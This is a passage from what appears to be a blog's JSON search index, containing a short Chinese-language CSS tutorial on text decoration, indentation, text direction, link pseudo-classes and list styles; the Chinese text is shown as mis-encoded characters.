æ–‡æœ¬ä¿®é¥°è£…é¥°æ–‡å­—ï¼Œå€¼ä¸ºnoneï¼ˆå»æ‰ä¿®é¥°ï¼‰ï¼Œunderlineï¼Œoverlineï¼Œline-throughï¼Œblinkã€‚ .a1&#123; text-decoration:overline; &#125; .a2&#123; text-decoration:line-through; &#125; .a3&#123; text-decoration:underline; &#125; æ–‡æœ¬ç¼©è¿›æ–‡æœ¬ç¼©è¿›å±æ€§æ˜¯ç”¨æ¥æŒ‡å®šæ–‡æœ¬çš„ç¬¬ä¸€è¡Œçš„ç¼©è¿›ã€‚ p {text-indent:50px;} æ–‡æœ¬æ–¹å‘å€¼æ˜¯ltræˆ–rtlã€‚ .a&#123; direction:rtl; &#125; æ–‡å­—å°±å…ˆå†™åˆ°è¿™ã€‚ CSS é“¾æ¥é“¾æ¥æ ·å¼ a:link - æ­£å¸¸ï¼Œæœªè®¿é—®è¿‡çš„é“¾æ¥ a:visited - ç”¨æˆ·å·²è®¿é—®è¿‡çš„é“¾æ¥ a:hover - å½“ç”¨æˆ·é¼ æ ‡æ”¾åœ¨é“¾æ¥ä¸Šæ—¶ a:active - é“¾æ¥è¢«ç‚¹å‡»çš„é‚£ä¸€åˆ» a:link {color: red;} CSSåˆ—è¡¨å¸¸ç”¨çš„å°±æ˜¯ ul&#123; list-style-type: none; list-style-type: disc; å®å¿ƒåœ† list-style-type: circle; ç©ºå¿ƒåœ† list-style-type: square; å®å¿ƒæ–¹æ ¼ &#125; æœ€å¸¸ç”¨å°±æ˜¯ none ç„¶åæ¢æˆè‡ªå·±æƒ³å¼„æˆçš„å›¾ç‰‡ã€‚ ol å¯¹åº”å°±æ˜¯ lower-alpha upper-alpha lower-romanç­‰ç­‰ï¼› ä½œä¸ºåˆ—è¡¨é¡¹æ ‡è®°çš„å›¾åƒ ul &#123; list-style-image: url(''); &#125;","categories":[],"tags":[{"name":"css","slug":"css","permalink":"http://chumen77.xyz/tags/css/"}]}]}